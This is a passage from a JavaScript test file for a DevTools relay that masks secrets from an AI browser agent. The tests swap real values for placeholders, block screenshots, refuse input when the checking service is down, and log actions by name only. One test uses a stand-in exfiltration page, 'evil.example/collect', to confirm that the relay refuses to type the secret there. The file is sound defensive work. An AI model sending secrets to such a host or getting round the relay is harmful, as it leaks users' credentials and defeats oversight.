    await a.send("Runtime.evaluate", { expression: "document.body.innerText", returnByValue: true });
    const made = "$MDU:web_fetch[8c4f].text";
    const step = await browserUseStep(a, made);
    assert.equal(step.inputFailed, true, "the input action fails on the ] that closes the made-up code, its fallback typing too");
    assert.equal(step.submitted, false, "so multi_act stops: the Submit click never runs");
    assert.ok(step.message.includes("no such placeholder $MDU:web_fetch[8c4f]"), step.message);
    assert.ok(step.message.includes(`the pages showed ${SYM}`), "the error names the placeholder the page showed");
    assert.deepEqual(submitsAtChrome(r), [], "Submit was never clicked, by mouse or by script");
    noneAtChrome(r, "$MDU:web_fetch[8c4f]");
    assert.deepEqual(r.chrome.typed, [], "the field stays empty, and nothing was submitted");
    assert.ok(r.arbiter.notices.length >= 1 && r.arbiter.notices.every((n) => n.notice.kind === "unknown" && n.notice.symbols[0] === "$MDU:web_fetch[8c4f]" && n.notice.shown?.[0] === SYM),
      "reported for the model's next call, names only");

    // The model's next step, the placeholder as the page shows it: typed, then submitted.
    const next = await browserUseStep(a, SYM);
    assert.equal(next.inputFailed, false);
    assert.equal(next.message, "", "the click is not told of the earlier refusal: it was told on its key");
    assert.deepEqual(submitsAtChrome(r), [{ typedBefore: [KEY] }], "Submit fired once, after the real value was in the field");
    assert.ok(!JSON.stringify(a.all).includes(KEY), "the agent never saw the value");

    // Fail-closed: the arbiter cannot answer the lookup; the step stops the same way.
    r.arbiter.lookupDown = true;
    const down = await browserUseStep(a, SYM);
    assert.equal(down.inputFailed, true);
    assert.equal(down.submitted, false);
    assert.match(down.message, /could not be looked up/);
    assert.equal(submitsAtChrome(r).length, 1, "no second Submit");
    assert.deepEqual(r.chrome.typed, [KEY], "nothing more typed");
  } finally {
    a.close();
    await r.close();
  }
});

test("an unreachable arbiter: answers are withheld as errors, events dropped, typing refused", async () => {
  const r = await rig("https://vercel.com/settings/env");
  const a = await agent(`ws://${new URL(r.base).host}/devtools/page/PAGE1`);
  try {
    r.arbiter.filterDown = true;
    r.arbiter.gateDown = true;
    const ans = await a.send("Runtime.evaluate", { expression: "document.body.innerText" });
    assert.match(ans.error.message, /withheld/);
    r.chrome.emit("Runtime.consoleAPICalled", { type: "log", args: [{ type: "string", value: `logged ${KEY}` }] });
    r.arbiter.noticeDown = true;
    const t = await a.send("Input.insertText", { text: SYM });
    assert.match(t.error.message, /could not be asked/, "a report that fails changes nothing for the agent");
    assert.deepEqual(r.arbiter.notices, []);
    assert.equal(a.events.length, 0, "the event was dropped");
    assert.ok(!JSON.stringify(a.all).includes(KEY));
    assert.deepEqual(r.chrome.typed, []);
  } finally {
    a.close();
    await r.close();
  }
});

test("the trace: one browser_action event per thing the relay did, names only; a failing emit changes nothing", async () => {
  const r = await rig("https://vercel.com/settings/env");
  const u = await rig("https://evil.example/collect");
  const a = await agent(`ws://${new URL(r.base).host}/devtools/page/PAGE1`);
  const b = await agent(`ws://${new URL(u.base).host}/devtools/page/PAGE1`);
  try {
    await a.send("Runtime.evaluate", { expression: "document.body.innerText", returnByValue: true });
    await a.send("Page.captureScreenshot", { format: "png" });
    await a.send("Input.insertText", { text: SYM });
    await b.send("Input.insertText", { text: SYM });
    r.arbiter.filterDown = true;
    await a.send("Runtime.evaluate", { expression: "document.body.innerText", returnByValue: true });
    await new Promise((res) => setTimeout(res, 50));
    const seen = [...r.arbiter.events, ...u.arbiter.events].map((e) => ({ action: e["action"], method: e["method"], page: e["page"], symbols: e["symbols"] }));
    assert.deepEqual(seen, [
      { action: "masked", method: "Runtime.evaluate", page: undefined, symbols: [SYM] },
      { action: "blocked", method: "Page.captureScreenshot", page: undefined, symbols: undefined },
      { action: "released", method: "Input.insertText", page: "vercel.com", symbols: [SYM] },
      { action: "withheld", method: "Runtime.evaluate", page: undefined, symbols: undefined },
      { action: "refused", method: "Input.insertText", page: undefined, symbols: [SYM] },
    ]);
    for (const e of [...r.arbiter.events, ...u.arbiter.events]) {
      assert.equal(e["kind"], "browser_action");
      assert.equal(e["emitter"], "cdp-relay");
      assert.equal(e["sessionId"], "s-relay");
      assert.ok(!JSON.stringify(e).includes(KEY), "an event never carries the value");
    }
    // The trace is off the security path: with emit failing, the agent
    // still reads the placeholder and the bound page still gets the value.
    r.arbiter.filterDown = false;
    r.arbiter.emitDown = true;
    const read = await a.send("Runtime.evaluate", { expression: "document.body.innerText", returnByValue: true });
    assert.match(String(read.result?.result?.value), /\$MDU:/);
    assert.deepEqual((await a.send("Input.insertText", { text: SYM })).result, {});
  } finally {
    a.close();
    b.close();
    await r.close();
    await u.close();
  }
});
